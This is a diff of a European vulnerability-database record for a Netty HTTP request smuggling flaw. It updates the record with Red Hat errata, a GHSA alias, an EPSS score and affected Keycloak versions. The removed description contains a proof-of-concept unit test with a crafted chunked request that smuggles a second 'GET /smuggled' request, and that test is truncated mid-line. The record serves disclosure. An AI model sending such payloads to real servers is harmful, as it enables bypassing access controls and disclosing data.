@@ -1,21 +1,88 @@
 {
   "id": "EUVD-2026-82935",
   "enisaUuid": "501e57fa-3d85-3be7-bac7-5113bf8df3fd",
-  "description": "### Summary\r\nNetty skips strict chunk size line validation when the line has no chunk extension (`;`), so a chunk size line containing an embedded bare CR (e.g. `0\\rX`) is accepted instead of rejected, enabling HTTP request smuggling.\r\n\r\n### Details\r\n`io.netty.handler.codec.http.HttpObjectDecoder#checkChunkExtensions` only runs the strict validator `HttpChunkLineValidatingByteProcessor` when a `;` is present:\r\n\r\n```java\r\n        int extensionsStart = line.bytesBefore((byte) ';');\r\n        if (extensionsStart == -1) {\r\n            return;\r\n        }\r\n```\r\n\r\nAccording to RFC 9112 https://datatracker.ietf.org/doc/html/rfc9112#appendix-A\r\n\r\n`chunk-size = 1*HEXDIG`\r\n\r\n### PoC\r\n\r\n```java\r\n@Test\r\npublic void test() {\r\n    String requestStr = \"POST / HTTP/1.1\\r\\n\" +\r\n            \"Host: localhost\\r\\n\" +\r\n            \"Transfer-Encoding: chunked\\r\\n\\r\\n\" +\r\n            \"0\\rX\\r\\n\" +\r\n            \"\\r\\n\" +\r\n            \"GET /smuggled HTTP/1.1\\r\\n\" +\r\n            \"Host: localhost\\r\\n\" +\r\n            \"Content-Length: 0\\r\\n\" +\r\n            \"\\r\\n\";\r\n\r\n    EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());\r\n    assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, Ch",
+  "description": "A flaw was found in Netty. A remote attacker could exploit this by sending a specially crafted HTTP request that includes control characters within the chunk-size line. This bypasses the intended strict validation, allowing the attacker to inject arbitrary HTTP requests. This vulnerability can lead to HTTP request smuggling, potentially resulting in information disclosure or other unauthorized actions.",
   "datePublished": "Sep 18, 2026, 2:19:29 PM",
-  "dateUpdated": "Sep 18, 2026, 2:19:29 PM",
+  "dateUpdated": "Nov 23, 2026, 12:14:34 PM",
   "baseScore": 6.5,
   "baseScoreVersion": "3.1",
   "baseScoreVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
   "references": [
+    "https://access.redhat.com/errata/RHSA-2026:102288",
+    "https://access.redhat.com/errata/RHSA-2026:69440",
+    "https://access.redhat.com/errata/RHSA-2026:69470",
+    "https://access.redhat.com/errata/RHSA-2026:83612",
+    "https://access.redhat.com/errata/RHSA-2026:95759",
+    "https://access.redhat.com/errata/RHSA-2026:95760",
+    "https://access.redhat.com/errata/RHSA-2026:95761",
+    "https://access.redhat.com/errata/RHSA-2026:95762",
     "https://access.redhat.com/security/cve/CVE-2026-93566",
     "https://bugzilla.redhat.com/show_bug.cgi?id=2536954"
   ],
   "aliases": [
-    "CVE-2026-93566"
+    "CVE-2026-93566",
+    "GHSA-9mrj-55p4-qwf4"
   ],
   "assigner": "redhat",
-  "epss": 0.0,
-  "enisaIdProduct": [],
-  "enisaIdVendor": []
+  "epss": 0.56,
+  "enisaIdProduct": [
+    {
+      "id": "1b16f3f6-c33f-314a-a9dd-3fdd341d0fe7",
+      "product": {
+        "name": "Red Hat build of Keycloak 26.6",
+        "vendor": {
+          "name": "Red Hat"
+        }
+      },
+      "product_version": "patch: 26.6-24"
+    },
+    {
+      "id": "1f5047a1-7f80-38ad-9555-8b83e90f4392",
+      "product": {
+        "name": "Red Hat build of Keycloak 26.6",
+        "vendor": {
+          "name": "Red Hat"
+        }
+      },
+      "product_version": "patch: 26.6.8-2"
+    },
+    {
+      "id": "c07cc487-4eec-3f75-ac21-052842b439a9",
+      "product": {
+        "name": "Red Hat build of Keycloak 26.4",
+        "vendor": {
+          "name": "Red Hat"
+        }
+      },
+      "product_version": "patch: 26.4-30"
+    },
+    {
+      "id": "ce338fee-da48-3827-9e21-14d21420489f",
+      "product": {
+        "name": "Red Hat build of Keycloak 26.4",
+        "vendor": {
+          "name": "Red Hat"
+        }
+      },
+      "product_version": "patch: 26.4-29"
+    },
+    {
+      "id": "f5a814bd-1c4b-31d0-9aaa-8da9936fad27",
+      "product": {
+        "name": "Red Hat build of Keycloak 26.4",
+        "vendor": {
+          "name": "Red Hat"
+        }
+      },
+      "product_version": "patch: 26.4.17-2"
+    }
+  ],
+  "enisaIdVendor": [
+    {
+      "id": "b632b4e9-a629-3dd5-b232-940a8d284e76",
+      "vendor": {
+        "name": "Red Hat"
+      }
+    }
+  ]
 }
